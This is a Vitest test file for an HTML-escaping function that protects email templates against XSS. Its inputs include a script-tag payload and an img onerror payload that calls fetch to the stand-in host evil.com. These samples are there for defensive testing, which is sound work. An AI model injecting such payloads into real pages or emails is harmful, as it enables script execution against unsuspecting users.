import { describe, it, expect } from 'vitest'
import { escapeHtml } from './email'

/**
 * Tests for email security — HTML escaping prevents XSS in email templates.
 */
describe('escapeHtml', () => {
  it('escapes angle brackets', () => {
    expect(escapeHtml('<script>alert("xss")</script>')).toBe(
      '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;'
    )
  })

  it('escapes ampersands', () => {
    expect(escapeHtml('Tom & Jerry')).toBe('Tom &amp; Jerry')
  })

  it('escapes quotes', () => {
    expect(escapeHtml('He said "hello"')).toBe('He said &quot;hello&quot;')
  })

  it('handles empty string', () => {
    expect(escapeHtml('')).toBe('')
  })

  it('does not double-escape', () => {
    expect(escapeHtml('&amp;')).toBe('&amp;amp;')
  })

  it('handles Hebrew text', () => {
    expect(escapeHtml('שלום עולם')).toBe('שלום עולם')
  })

  it('prevents img tag XSS — angle brackets escaped', () => {
    const input = '<img src=x onerror=fetch("evil.com")>'
    const result = escapeHtml(input)
    expect(result).not.toContain('<img')
    expect(result).toContain('&lt;img')
    // onerror is still in the string but the < and > are escaped so it won't execute
    expect(result).not.toContain('<')
  })
})
